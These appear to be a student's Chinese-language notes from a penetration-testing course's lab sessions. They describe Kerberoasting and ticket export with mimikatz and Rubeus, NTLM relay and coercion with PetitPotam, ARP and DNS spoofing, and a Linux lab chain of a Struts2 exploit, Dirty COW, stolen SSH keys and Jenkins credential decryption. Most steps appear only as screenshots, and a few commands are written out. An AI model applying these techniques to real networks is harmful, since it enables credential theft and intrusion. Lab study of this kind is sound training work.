![1733319708457](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942212.png)



####   历史漏洞

 历史遗留的票据重新认证尝试。DC登录过目标机器，或者连接过（比如说更改当前机器防火墙就需要登录域管权限）。就会有票据遗留，所以就可以抓出来这个票据（时间就几个小时内登录过）

这里执行命令需要system权限，我这里环境没有配置好，导致提权不了，提权到system需要MS14-058漏洞，这款漏洞支持反向后门，但我这儿环境反向不了。所以没有演示：

![1733320448934](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942213.png)

执行mimikate导出命令后，发现多了administrator的几个票据，然后导入，连接，上线。

![1733320317007](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942214.png)

  成功与否看加密类型------RC4类型（暴力破解）

 手工监测：SPN技术获取域内通讯服务，在去连接通讯服务，连接后查看票据加密类型能否支持爆破。



![1733321268609](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942215.png)

mimikatz kerberos::ask /target:MSSQLSvc/SqlServer.god.org:1433

![1733321289154](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942216.png)

这里的web机和DC不信任了。所以报错：

下来只需要查看klist看是什么加密类型：--会话密钥类型是不是rc4,

工具检测（需要考虑免杀和通讯问题） ：

Rubeus kerberoast     检测有没有rc4加密，这里是aes加密。如果为rc4加密的话会破解出来他的hash值

![1733321644240](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942217.png)

jack机登场：破解出来为文件票据：用 tgsrepcrack.py解密手工生成的票据      为HASH密文：hashcat 。

Rubeus   							破解主机后获取为hash值。  这里的目标为0day/jack

![1733326096273](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942218.png)

Rubeus kerberoast

![1733386730489](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942219.png)

impacket-getuserspns        这个破解后为hash值。用py文件建立代理测试，后连接破解生成hash.txt，内容和上面工具的hash一样.。用socks代理在提醒一下，代理服务器为c2服务器，端口为socks端口，差点将ip写成jack机的。：

![1733387427775](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942220.png)

用py工具连接并且将能破解的票据格式保存到hash.txt：

![1733387565057](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942221.png)

手工查看：

![1733387680076](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942222.png)

###### 票据破解：

先看spn服务，在找到能通讯的服务--msssql，在用mimikate产生票据，最后导出并破解：

![1733387985231](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942223.png)

用mimikate将票据拿出来然后破解，手工连接（mimikate）后会产生票据，这时候用Mimi导出来然后用py工具破解。

将获取到的票据导出来：

![1733388225497](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942224.png)

下载到本地：

![1733388313896](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942225.png)

![1733388410795](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942226.png)

用kerberoast.py 破解票据：

![1733388684919](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942227.png)

###### hash破解：

将刚才Rubeus 得到的hash或者impacket-getuserspns得到的hash.txt用hashcat进行破解：

先看票据的加密类型为rc4类型，因为后面需要hashcat -m后的参数类型需要和当前加密一致：

![1733389146622](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942228.png)

![1733389322460](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942229.png)



有明文传递，肯定用明文->没有明文就用，PTH(HASH传递)->PTT(票据攻击)3个方法->PTK(AES)

### ptk    AEC  加密

条件严格：系统安装了KB2871997补丁（打了补丁也不一定好。哈哈）且禁用了NTLM（禁用.......）的时候，和ptt你死我活的样子。

鸡肋：得有图形化UI页面，这里不适用。最后弹出来的在目标机桌面终端操作



# 184：重放攻击

中间人攻击，NTML、重放攻击。

捕获，重放，爆破           kali环境已配好，3个网卡，既能和本机通讯，也能和god内网通讯

  捕获，用kali (配置时候记得先拍个快照)，一般用钓鱼 ，让对方访问（被动方式）。用得到的hash值可以重放， kali 监听webserver，sqlserver执行访问kali的命令（net use  ip(kali)会将自己的用户密码给kali），然后得到web的回弹。kali就是做的是中继重放，然后给了web，web比对后和sql密码一致，执行了kali重放过来的上线命令。31web   32sql  21 DC

kali监听，用web机进行通讯---因为web和kali的账户密码不匹配，所以没有成功，不过得到的hash可以用来比对重放：

![1733753163835](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942272.png)









 不同用户/相同用户都尝试,。web用administrator去尝试连接sql成功，反之sql也是。web用自己的webadmin用户去连接sql不行，拒绝。就是因为用户密码不同。这里就是web机重放攻击sql机

 降权 令牌窃取和进程注入。

  脚本重放攻击

 破解重放的hash ------- 重放失败 

![1733757925010](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942273.png)

   强制的。  Coercer 自动化工具。让目标主机强制的访问别的主机（前面是钓鱼式的）。然后就可以抓到目标访问的hash，拿到后可以用来利用。

##### 强制访问

让目标主机（21）强制访问被控机（32）：

![1733757243654](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942274.png)

被控机sql监听：

![1733757315850](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942275.png)

或者在kali中监听，让DC强制访问kali主机：

![1733757476371](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942276.png)



  另2个工具。先用前面的工具smbrelayx.py监听，再用下来的两个工具进行强制访问获取hash -------- 。就是让目标用户（Web机被控机）访问本机（kali），然后本机在将请求重放到3.22DC（目标机）后在执行whoami。这里需要用户密码都对应着。

![1733757857637](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942277.png)

最后还是用PetitPotam.py实现强制让目标访问kali，kali本地用py监听成功收到：

强制访问：让31访问128

![1733758304978](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942278.png)

监听到webserver的目标，wd：

![1733758369861](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942279.png)

，总结用这些方法主要还是看环境，看环境适用哪种方法。强制访问抓的是机器密码，钓鱼抓的是用户密码

 不断翻车，没有复现


# 域森林

不用复现。需要内存和运行不起来。

主要是与前面课程的单域环境之间看有什么差异。



![1734011322125](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942328.png) 

这里可以看见前面有很多的....                 h.hr.xiaodi.org

![1734011644197](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942329.png)

这里也可以Ping hhrdc来定位ip

当前处于           hr.xiaodi.org           上一级就是xiaodi.org          下一级是  xx.hr.xiaodi.org

看有没有上一级或者下一级还可以看计算机名字

XDORG（xiaodi.org）					XDORG/webadmin     xiaodi.org的域用户

​	HRXRORG(hr.xiaodi.org)				   hr.xiaodi.org的域为：HRXRORG

​		HHRORG(h.hr.xiaodi.org)               h.hr.xiaodi.org的域为：HHRORG

​	GAXDORG(ga.xiaodi.org)						GAXDORG/administrator      ga.xiaodi.org的DC

​		GGAORG(h.ga.xiaodi.org)

XIAODI8（xiaodi8.org）

横向移动时候，其实主要还是看域用户对应正确，然后口令密码正常。限制：网络不通讯，就打一个能与自己通讯然后一层一层绕到能和目标通讯的机子

域名     ----- 域内用户    ---------- 用户密码 -------------  通讯---- DC的ip        这几个都要一一对应

这节就不复现了，因为主要为理解，没有太多知识

# 188：工作组

 针对的是工作组和局域网下的环境，非域环境。攻击主要是针对网络攻击，与目标是什么操作系统无关

内网：域环境，工作组

中间人攻击：SSLStrip攻击、ARP欺骗攻击、SSL劫持攻击。。。。

网络环境：

![1734085220532](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942330.png)

##### arp：

  	火绒---139.139       win7 ----  139.2         360 ----139.131       kali        ping后获取到ip和Mac地址，在火绒上用科来对目标win7 发送错误的mac地址，使目标ip的mac地址改为自己已经设置的，这样目标win7  就没有网络了。这就是单向欺骗。所以一般需要将ip和mac地址绑定，这样mac地址就为静态了，攻击网络就不会发生没网的情况了。这就是骗ip我是你的网关（mac地址）

网关地址：192.168.139.2                 目标机work----139.129    目标机360：139.132

因为这里是动态的，所以就先用单向欺骗：

![1734095544195](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942331.png)

科莱-------单向欺骗：

![1734096865321](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942332.png)

目标机反应：

![1734096707202](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942333.png)

断网：

![1734096812638](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942334.png)



  双向欺骗----------既骗ip我是你的网关，又骗网关我是你的ip。----------         断网

![1734097484022](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942335.png)

用自己的mac地址伪造成360的ip

![1734098013483](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942336.png)

用别的ip伪造mac地址

![1734098129871](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942337.png)

开始：

![1734098219907](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942338.png)

  确保本机（攻击机）和目标机（手机）在同一个局域网下。科莱正常来说是抓不到手机的流量的。需要用工具来抓手机的流量------Arpspoof-----需要用管理员运行 ---------- 先过去目标网段。自动执行双向欺骗，充当一个中间人给双方发送流量，----------Arpspoof运行后，本机科莱就可以监听到手机流量了

这里搞不了，电脑内存跟不上科莱的节奏

![1734098769098](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942339.png)

管理员运行，不过就是arpspoof.exe 手机ip 就可以在科莱中监控到手机流量

不会影响目标网络通讯

##### dns欺骗：

 可能会引起目标网络不稳定，所以与arp比起来还是差点意思ettercap------kali里的ettercap，这里还需要修改一个文件，* A ip   修改解析。然后这里修改文件里还有个插件----就是dns欺骗。实现就是域名相同，但是打开的页面是自己显示出的页面。会掉完。

在内网域中用不了是因为内网域是由DC操控的，都听DC的，不会被骗

![1734099054574](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942340.png)

修改这个文件：

![1734100464710](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942341.png)

配置文件

![1734100530994](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942342.png)

后面即可开始攻击

![1734100606325](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942343.png)

![1734100621085](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942344.png)

使用插件里面的这个进行钓鱼

![1734100654647](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942345.png)

# 189: linux

linux横向移动主要为ssh、web。         这里10、30、50都是机器ip的尾缀（前面都是172.16.250）

shh协议中，登录连接目标机器主要方式有密码和密钥对（密钥对文件）登录

​        看主机是密码还是密钥登录方式。密码就是猜测爆破得到，密钥就是找配置文件或者在历史命令中找，全局搜索命令

![1734265624954](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942346.png)

![1734253580338](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942347.png)

  全局搜索、搜索含有SSH凭证文件

![1734265688504](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942348.png)

  linux靶场，先拿到web权限后提权---这里是tomcat用户权限（10机器），所以需要提权，这里是linux提权，这里选择用脏牛提权，先将脏牛漏洞里的.c上传放到目标的tmp目录，然后gcc编译目标.c文件成可执行文件，因为脏牛系列会弹shell所以这里需要先用py起一个终端在执行文件，然后在用命令让反弹的权限持续下来。

先namp扫到目标机：-----这里眼瞎了耽搁，没看清ip然后xd给了靶场的账号密码。

nmap扫太慢了。就是扫到了3个ip  分别就是图上的3个ip，这里就不看了------环境说明kali 和目标机在一个网段中

![1734267076853](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942349.png)

#### 10

目标机上存在strut2的历史漏洞：

![1734267254293](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942350.png)

拿到10的权限：

![1734267300129](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942351.png)

.c上传放到目标的tmp目录，然后gcc编译目标.c文件成可执行文件（当然这里目标机是有gcc环境的）

![1734267559024](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942352.png)



脏牛系列会弹shell所以这里需要先用py起一个终端在执行文件

![1734267622068](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942353.png)

用命令让反弹的权限持续下来

![1734267780901](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942354.png)

这里注意：这两个命令都要执行，刚才就只执行第一个导致掉线了。

![1734268220373](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942355.png)

#### 30：

得到root权限后查看历史命令发现用过密钥文件登录过其他主机，这里就将密钥文件下载到本地，然后利用文件登录另一台目标主机（30主机）-----------这里得到30主机后因为是通过ssh密钥连接，但是没有8080端口权限，因为50机器的3306是和30机器的8080端口是有关系的，所以这里需要先得到30主机的8080端口权限。

查看历史命令，找到了密钥对文件，所以将密钥对文件复制到本地来，因为本地也可以和30通讯

![1734268324008](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942356.png)

![1734270231653](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942357.png)

这里kali 的ssh坏了，没修好，不过执行下面两个命令后就可以连接得到30的权限：

![1734270098226](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942358.png)



后面本机ssh成功，下面有解释：

![1734273923643](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942359.png)

​      30主机的8080在DMZ区，所以本地是访问不到，需要在10建立节点通讯（这里是因为30在DMZ区域，本地只能访问到22端口，访问不到8080，所以建立30节点也不行，而10访问30时可以访问到30的8080端口），这里是linux的msf创建节点。

![1734270464496](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942360.png)

  配置节点有个坑，创建了却访问不到，需要先将被控机路由添加进来然后在建立节点，这里就成功建立节点了，还有配置proxychaix.config文件时，不仅要改端口和版本，这里还有更改动态和静态配置--------  还是翻车，最后用的是windows的proxifier进行配置代理。不过上面的节点还是需要建立的。

建立路由：

![1734270707798](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942361.png)

![1734270701749](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942362.png)

还需要改这儿：意思就是当使用proxychains4时候，这时候的流量就是一直走代理，不是执行一次才走一次。

![1734270849776](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942363.png)

配置好，记得   run：

![1734271594450](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942364.png)

![1734271651872](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942365.png)

建立通讯：

![1734271724580](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942366.png)

#### 50：

找到jenkins路径后打开发现有credentials,这里是存放密钥的地方

![1734271813045](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942368.png)

可以看到30主机是有jenkins，这是一种监控配置文件，里面可能存一些配置性文件。这里是有数据库配置性文件，里面找到了连接50的数据库的操作记录，

![1734272015168](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942369.png)

然后30这边的网页打开发现da数据库，这里就猜测是与50目标机有关，因为上面30机尝试连接过50的mysql。

![1734272141712](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942370.png)

1h  前端更改隐藏密码功能，还需要解密，需要三个文件。

点进去db_backup然后发现有账号密码：

![1734272289584](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942371.png)

先去除密码隐藏，只需要将上面的password置空即可：

![1734272361165](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942372.png)

 这里就得用nc监听30让他主动给出来文件,让进行解密。解密后进行连接50就行

上面得到的密码就是jenkins的加密算法，需要解密3个文件进行解密：

这里刚才的没ssh连接成功30又回来了，用本地机器连接（这里代理没有断），但是报错一直Permission denied, please try again.管理员打开cmd也不行，最后才是这样，怪不得在kali中也只是给他0600 的权限，不给777，因为这里这个id_rsa文件（是刚才在10上获取连接30的密钥文件）权限设置得太开放，SSH 客户端要求私钥文件不能被其他用户访问。

所以下面这样让文件只允许一个人（本地用户）访问---（这类文件应该都一样）

![1734273694441](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942373.png)

成功：

![1734273884074](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942374.png)

那么这里就用本地作为中转，这里代理好后可以和攻击机和目标机都能通讯：

![1734274219512](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942375.png)

下来接着上面的解密，已经得到了解密的密码，需要3个解密文件。获取：

![1734274452407](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942376.png)

解密需要的py环境也难配置，一直报这个Crtpto，最后需要安装pycrptodome模板，有时候报错将脚本的导入from Crypto.Cipher import AES语句扔给gpt，他能知道你需要下载的是哪个脚本：

![1734275284369](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942377.png)

解密得到的3个解密文件，得到了最后的密码---用py解密出来的文件如果是这样：     b'asdasd'   这里是密码应该是asdasd   因为py解密出来的前面的b是bit字节流的意思  ，所以这里的b')uDvra{4UL^;r?*h'   最后的密码就是：       	)uDvra{4UL^;r?*h   ：

![1734275429367](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942378.png)

用密码连接50，这里的用户就是刚才30网站得到的db_backup的用户名：

![1734275839162](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942379.png)

![1734275857031](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942380.png)

提权没有设置难度，直接就是sudo su   （这是提到最高权限的命令，而不是su root）.....：

![1734275991667](https://cdn.jsdelivr.net/gh/maybeyjb/blue-team/img/202506170942381.png)



